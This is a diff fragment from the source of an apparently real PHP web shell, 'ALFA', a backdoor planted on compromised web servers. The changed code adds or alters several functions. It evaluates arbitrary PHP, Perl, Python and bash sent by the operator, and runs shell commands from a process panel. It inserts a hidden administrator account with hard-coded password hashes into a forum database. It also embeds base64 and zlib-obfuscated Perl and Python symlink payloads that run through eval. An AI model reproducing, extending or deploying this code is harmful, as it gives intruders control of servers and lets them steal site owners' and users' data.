+echo '<div class="editor-view"><div class="view-content editor-ace-controller"><div style="display:inline-block;">'._alfa_load_ace_options("editor").'<button style="border-radius:10px;" class="button ace-controler" onClick="copyToClipboard(this);">Copy</button> <button class="button ace-controler" onclick="alfaAceToFullscreen(this);">Full Screen</button> <button onclick="var ace_val = alfa_ace_editors.editor[this.getAttribute(\'ace_id\')].getValue();editor(\''.addslashes($alfa1_decoded).'\',\'edit\',\'1\'+ace_val,\''.$_POST['c'].'\',\''.$_POST['alfa4'].'\',\''.$ftype.'\');return false;" class="button ace-controler ace-save-btn" style="width: 100px;height: 33px;'.$disabled_btn_style.'" '.$disabled_btn.'>save</button></div><pre class="ml1 view_ml_content">';
 echo htmlspecialchars(__read_file($_POST['alfa1']));
 echo '</pre></div></div>';
 break;
@@ -3398,7 +3098,7 @@ echo str_replace(array('<span ','</span>'), array('<font ','</font>'),$code).'</
 break;
 case 'delete':
 @chdir($_POST['c']);
-if(@is_writable($_POST['alfa1'])||isset($GLOBALS["glob_chdir_false"])){
+if(@is_writable($_POST['alfa1'])||$GLOBALS["glob_chdir_false"]){
 $deleted = true;
 if(!@unlink($_POST['alfa1'])){
 	$deleted = false;
@@ -3433,33 +3133,6 @@ if($chdir_fals){
 	$file_perm = substr(sprintf('%o', @fileperms($_POST['alfa1'])),-4);
 }
 echo '<script>alfa3_="";</script><form onsubmit="editor(\''.addslashes($_POST['alfa1']).'\',\''.$_POST['alfa2'].'\',this.chmod.value,\''.$_POST['c'].'\',\''.$_POST['alfa4'].'\',\''.$ftype.'\');return false;"><input type="text" name="chmod" value="'.$file_perm.'"><input type=submit value=" "></form>';
-break;
-case 'edit':
-@chdir($_POST['c']);
-if(!@is_writable($_POST['alfa1'])&&!_alfa_is_writable($_POST['alfa1'])){
-echo 'File isn\'t writeable';
-break;
-}
-if(!empty($_POST['alfa3'])){
-$_POST['alfa3'] = substr($_POST['alfa3'],1);
-$time = @filemtime($_POST['alfa1']);
-$fp = @__write_file($_POST['alfa1'],$_POST['alfa3']);
-if($chdir_fals&&$alfa_canruncmd){
-	$rname = $alfa1_decoded;
-	$randname = $rname.rand(111,9999);
-	$filepath = dirname($_SERVER["SCRIPT_FILENAME"])."/".$randname;
-	if($fp = @__write_file($filepath ,$_POST['alfa3'])){
-		alfaEx("mv '".addslashes($filepath)."' '".addslashes($_POST["alfa1"])."';rm -f '".addslashes($filepath)."'");
-	}
-}
-if($fp){
-echo 'Saved!<br><script>alfa3_="";</script>';
-@touch($_POST['alfa1'],$time,$time);
-}
-}
-echo '<button class="button" style="border-radius:10px;" onClick="copyToClipboard(\'edit_textarea_content\');">copy to clipboard</button><form id="editor_edit_area" onsubmit="editor(\''.addslashes($alfa1_decoded).'\',\''.$_POST['alfa2'].'\',\'1\'+this.text.value,\''.$_POST['c'].'\',\''.$_POST['alfa4'].'\',\''.$ftype.'\');return false;"><p><input type="submit" value=" "></p><textarea name="text" id="edit_textarea_content" class="bigarea" onkeydown="saveByKey(event);">';
-echo htmlspecialchars(__read_file($_POST['alfa1']));
-echo '</textarea><p><input type="submit" value=" "></p></form>';
 break;
 case 'hexdump':
 @chdir($_POST['c']);
@@ -3503,7 +3176,7 @@ $cmd_rename = true;
 $alfa1_escape = addslashes($_POST["alfa1"]);
 }
 if(!@rename($_POST['alfa1'], $_POST['alfa3'])&&$cmd_rename){
-echo 'Can\'t rename!<br>';}else{echo('Renamed!<script>try{$("'.$_POST['alfa4'].'").innerHTML = "<div class=\'editor-icon\'>"+loadType(\''.$alfa3_escape.'\',\''.$ftype.'\',\''.$_POST['alfa4'].'\')+"</div><div class=\'editor-file-name\'>'.$alfa3_escape.'</div>";editor_files["'.$_POST['alfa4'].'"].file = "'.$alfa3_escape.'";d.files.innerHTML = d.files.innerHTML.replace(/\\\''.$alfa1_escape.'\\\'/g, "\''.$alfa3_escape.'\'");d.files.innerHTML = d.files.innerHTML.replace(/value\=\"'.$alfa1_escape.'\"/, \'value\=\"'.$alfa3_escape.'\"\');d.files.innerHTML = d.files.innerHTML.replace(/'.$alfa1_escape.'\<\/a\>/g, "'.$alfa3_escape.'</a>");d.files.innerHTML = d.files.innerHTML.replace(/Are You Sure For Delete # '.$alfa1_escape.' # \?/, "Are You Sure For Delete # '.$alfa3_escape.' # ?");'.($ftype == "dir"?"updateDirsEditor('".$_POST['alfa4']."','".$alfa1_escape."');":"").'}catch(e){console.log(e)}</script>');$alfa1_escape = $alfa3_escape;}
+echo 'Can\'t rename!<br>';}else{echo('Renamed!<script>try{$("'.$_POST['alfa4'].'").innerHTML = "<div class=\'editor-icon\'>"+loadType(\''.$alfa3_escape.'\',\''.$ftype.'\',\''.$_POST['alfa4'].'\')+"</div><div class=\'editor-file-name\'>'.$alfa3_escape.'</div>";editor_files["'.$_POST['alfa4'].'"].file = "'.$alfa3_escape.'";updateFileEditor("'.$alfa1_escape.'", "'.$alfa3_escape.'");'.($ftype == "dir"?"updateDirsEditor('".$_POST['alfa4']."','".$alfa1_escape."');":"").'}catch(e){console.log(e)}</script>');$alfa1_escape = $alfa3_escape;}
 }
 echo '<form onsubmit="editor(\''.$alfa1_escape.'\',\''.$_POST['alfa2'].'\',this.name.value,\''.$_POST['c'].'\',\''.$_POST['alfa4'].'\',\''.$ftype.'\');return false;"><input type="text" name="name" value="'.addslashes(htmlspecialchars(isset($_POST['alfa3'])&&$_POST['alfa3']!=''?$_POST['alfa3']:$alfa1_decoded)).'"><input type=submit value=" "></form>';
 break;
@@ -3572,7 +3245,7 @@ if(@is_file($_POST['file']) && @is_readable($_POST['file']) || $alfa_canruncmd){
 ob_start("ob_gzhandler", 4096);
 header("Content-Disposition: attachment; filename=\"".addslashes($basename)."\"");
 header("Content-Type: application/octet-stream");
-if(isset($GLOBALS["glob_chdir_false"])){
+if($GLOBALS["glob_chdir_false"]){
 	$randname = $basename.rand(111,9999);
 	$scriptpath = dirname($_SERVER["SCRIPT_FILENAME"]);
 	$filepath = $scriptpath."/".$randname;
@@ -3587,7 +3260,17 @@ if(isset($GLOBALS["glob_chdir_false"])){
 	readfile($_POST['file']);
 }
 }else echo('Error...!');}}
+function __alfa_set_cookie($key, $value){
+	$_COOKIE[$key] = $value;
+	@setcookie($key, $value, time()+(86400 * 7), '/');
+}
 function alfaphpeval(){
+if(isset($_COOKIE["eval_tmpdir"])&&@is_dir($_COOKIE["eval_tmpdir"])){
+	$tempdir = __ZGVjb2Rlcg($_COOKIE["eval_tmpdir"]);
+}else{
+	$tempdir = dirname(alfaEx("mktemp"));
+	__alfa_set_cookie("eval_tmpdir", __ZW5jb2Rlcg($tempdir));
+}
 alfahead();
 if(isset($_POST['alfa2']) && ($_POST['alfa2'] == 'ini')){
 echo '<div class=header>';
@@ -3627,20 +3310,14 @@ echo '</div><br>';
 }
 $lang_html = "";
 foreach(array("php"=>"php ~> [ Windows / Linux ]","perl"=>"perl ~> [ Linux ]","python"=>"python ~> [ Linux ]","bash"=>"bash ~> [ Linux ]") as $key=>$val){$lang_html .= '<option value="'.$key.'" '.($_POST["alfa3"]==$key?"selected":"").'>'.$val.'</option>';}
-echo '<div class=header><Center><a href=javascript:void(0) onclick="g(\'phpeval\',null,\'\',\'ini\')">| INI_INFO | </a><a href=javascript:void(0) onclick="g(\'phpeval\',null,\'\',\'info\')"> | phpinfo |</a><a href=javascript:void(0) onclick="g(\'phpeval\',null,\'\',\'exten\')"> | extensions |</a></center><br><form name=pf method=post onsubmit="g(\'phpeval\',null,this.code.value,null,this.language.value); return false;"><div class="txtfont">Select Language: </div> <select name="language" style="width:300px;">'.$lang_html.'</select><br><br><textarea placeholder="file_get_contents(\'/etc/passwd\');" name=code class=bigarea id=PhpCode>'.(!empty($_POST['alfa1'])?htmlspecialchars($_POST['alfa1']):'').'</textarea><center><input type="submit" value="" style="margin-top:5px"></center>';
-echo '</form><pre id=PhpOutput style="'.(empty($_POST['alfa1'])?'display:none;':'').'margin-top:5px;" class=ml1>';
+echo '<div class=header><Center><a href=javascript:void(0) onclick="g(\'phpeval\',null,\'\',\'ini\')">| INI_INFO | </a><a href=javascript:void(0) onclick="g(\'phpeval\',null,\'\',\'info\')"> | phpinfo |</a><a href=javascript:void(0) onclick="g(\'phpeval\',null,\'\',\'exten\')"> | extensions |</a></center><br><form class="php-evals" name="pf" method="post" onsubmit="var ace_value=geEvalAceValue(this);g(\'phpeval\',null,ace_value,null,this.language.value); return false;"><div class="txtfont">Select Language: </div> <select name="language" style="width:300px;">'.$lang_html.'</select>'._alfa_load_ace_options("eval").'<br><br><div class="bigarea" style="position:relative;"><div class="php-evals-ace">'.(!empty($_POST['alfa1'])?htmlspecialchars($_POST['alfa1']):"&lt;?php\n\n\techo('hello alfa !');\n\n?>").'</div></div><center><input type="submit" value="" style="margin-top:5px"></center>';
+echo '</form><pre id="PhpOutput" style="'.(empty($_POST['alfa1'])?'display:none;':'').'margin-top:5px;" class="ml1">';
 if(!empty($_POST['alfa1'])){
 if($_POST['alfa3']=="php"){
 ob_start();
-eval($_POST['alfa1']);
+eval('?>'.$_POST['alfa1']);
 $result = htmlspecialchars(ob_get_clean());
 }elseif(_alfa_can_runCommand()&&$GLOBALS["sys"]=="unix"){
-	if(isset($_SESSION["eval_tmpdir"])){
-		$tempdir = $_SESSION["eval_tmpdir"];
-	}else{
-		$tempdir = dirname(alfaEx("mktemp"));
-		$_SESSION["eval_tmpdir"] = $tempdir;
-	}
 	$lang = $_POST['alfa3'];
 	$filename = "temp".rand(11111,99999);
 	$temp = $tempdir."/".$filename ;
@@ -3649,7 +3326,7 @@ $result = htmlspecialchars(ob_get_clean());
 	@unlink($filename);
 	@unlink($temp);
 }
-echo '<textarea class=bigarea id="PhpCode">'.$result.'</textarea>';
+echo '<textarea class="bigarea">'.$result.'</textarea>';
 }
 echo '</pre></div>';
 alfafooter();
@@ -3697,7 +3374,7 @@ ob_start();
 eval('echo '.$code.';');
 $res = ob_get_contents();
 ob_end_clean();
-if(in_array($alg, $stringTools))echo '<textarea class="bigarea" id="PhpCode">'.htmlspecialchars($res).'</textarea>';
+if(in_array($alg, $stringTools))echo '<textarea class="bigarea">'.htmlspecialchars($res).'</textarea>';
 }
 echo "</div>";
 alfaFooter();
@@ -3885,7 +3562,7 @@ function alfaproc()
 alfahead();
 echo "<Div class=header><br><center>";
 if(empty($_POST['ajax'])&&!empty($_POST['alfa1']))
-$_SESSION[md5($_SERVER['HTTP_HOST']).'ajax'] = false;
+$_COOKIE[md5($_SERVER['HTTP_HOST']).'ajax'] = false;
 if($GLOBALS['sys']=="win"){
 $process=array(
 "Task List" =>"tasklist /V",
@@ -3916,8 +3593,8 @@ echo '<a href="javascript:void(0);" onclick="g(\'proc\',null,\''.$link.'\')"> | 
 echo "</center><br>";
 if(!empty($_POST['alfa1'])){
 echo "<pre class='ml1' style='margin-top:5px' >";
-if(isset($GLOBALS["glob_chdir_false"])&&!empty($_POST["c"])){$cmd = "cd '".addslashes($_POST["c"])."';";}
-echo alfaEx($cmd.$_POST['alfa1']);
+if($GLOBALS["glob_chdir_false"]&&!empty($_POST["c"])){$cmd = "cd '".addslashes($_POST["c"])."';";}
+echo alfaEx($cmd.$_POST['alfa1'], true);
 echo '</pre>';
 }
 echo "</div>";
@@ -4327,15 +4004,23 @@ $password = $_POST['alfa6'];
 $prefix = $_POST['alfa7'];
 $admin = $_POST['alfa8'];
 $SQL = $_POST['alfa9'];
-$conn=@mysqli_connect($localhost,$username,$password,$database) or die(mysqli_error($conn));
+$conn=@mysqli_connect($localhost,$username,$password,$database) or die(mysqli_connect_error());
+$pw_col = @mysqli_connect("SELECT column_name FROM information_schema.columns where table_name = '{$prefix}user' and column_name = 'password' and table_schema = '{$database}'");
+$pw_col = @mysqli_num_rows($pw_col);
+$adm_perm = "16744444";
+if($pw_col > 0){
 $solevisible=@mysqli_query($conn,"insert into {$prefix}user (userid,usergroupid,username,password,salt,email,passworddate,joindate) values(null,'6','$admin','52e28b78f55641cd4618ad1a20f5fd5c','Xw|IbGLhTQA-AwApVv>61y^(z]*<QN','$SQL','".date('Y-m-d')."','".time()."')") or die(mysqli_error($conn));
+}else{
+$adm_perm = "2143256444";
+$solevisible=@mysqli_query($conn,"insert into {$prefix}user (userid,usergroupid,username,token,secret,email,passworddate,joindate,scheme,birthday_search) values(null,'6','$admin','\$2y\$10\$YsVhV.9tLnzBYxar1BJAGO3vFz68/qDU7Jt62SDdLy6lUT9N5Z/wq','Qf~ADeA}iAey-&#ALQF<}/uBDqSnw>','$SQL','".date('Y-m-d')."','".time()."','blowfish:10','1984-05-20')") or die(mysqli_error($conn));
+}
 $solevisible=@mysqli_query($conn,"select userid from {$prefix}user where username='".$admin."'") or die(mysqli_error($conn));
 $sole = mysqli_num_rows($solevisible);
 if($sole == 1){
 $solevis = mysqli_fetch_assoc($solevisible);
 $res = $solevis['userid'];
 }
-$solevisible=@mysqli_query($conn,"insert into {$prefix}administrator (userid,adminpermissions) values('".$res."','16744444')") or die(mysqli_error($conn));
+$solevisible=@mysqli_query($conn,"insert into {$prefix}administrator (userid,adminpermissions) values('".$res."','".$adm_perm."')") or die(mysqli_error($conn));
 if($solevisible){
 __alert('Success... '.$admin.' is created...');}
 }
@@ -4596,17 +4281,25 @@ function alfaGetDomains($state = false){
 	}
 	return array("lines" => $lines, "state" => $state);
 }
+function alfaCreateParentFolder(){
+	$parent = $GLOBALS['home_cwd'] . "/" . __ALFA_DATA_FOLDER__;
+	if(!@is_dir($parent)){
+		@mkdir($parent, 0755, true);
+	}
+}
 function alfasymlink(){
 alfahead();
 AlfaNum(9,10);
+alfaCreateParentFolder();
+@chdir($GLOBALS['home_cwd'] . "/" . __ALFA_DATA_FOLDER__);
 echo '<div class=header><br><center><div class="txtfont_header">| Symlink |</div><center><h3><a href=javascript:void(0) onclick="g(\'symlink\',null,null,\'symphp\')">| Symlink( php ) | </a><a href=javascript:void(0) onclick="g(\'symlink\',null,null,\'symperl\')">| Symlink( perl ) | </a><a href=javascript:void(0) onclick="g(\'symlink\',null,null,\'sympy\')">| Symlink( python ) | </a><a href=javascript:void(0) onclick="g(\'symlink\',null,null,null,null,\'SymFile\')">| File Symlink | </a></h3></center>';
 if(isset($_POST['alfa2'])&&($_POST['alfa2']=='symperl'||$_POST["alfa2"]=="sympy")){
 	$sympath = alfaMakePwd();
 	@mkdir('cgialfa',0755);
 	@chdir('cgialfa');
 	alfacgihtaccess('cgi');
-	$perl = '#!/usr/bin/perl   -I/usr/local/bandmin'."\n".'use MIME::Base64;use Compress::Zlib;eval(Compress::Zlib::memGunzip(decode_base64("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")));';
-	$py = '#!/usr/bin/python'."\nimport zlib, base64\n".'eval(compile(zlib.decompress(base64.b64decode("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")),\'<string>\',\'exec\'))';
+	$perl = '#!/usr/bin/perl   -I/usr/local/bandmin'."\n".'use MIME::Base64;use Compress::Zlib;my $alfa_data="'.__ALFA_DATA_FOLDER__.'";eval(Compress::Zlib::memGunzip(decode_base64("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")));';
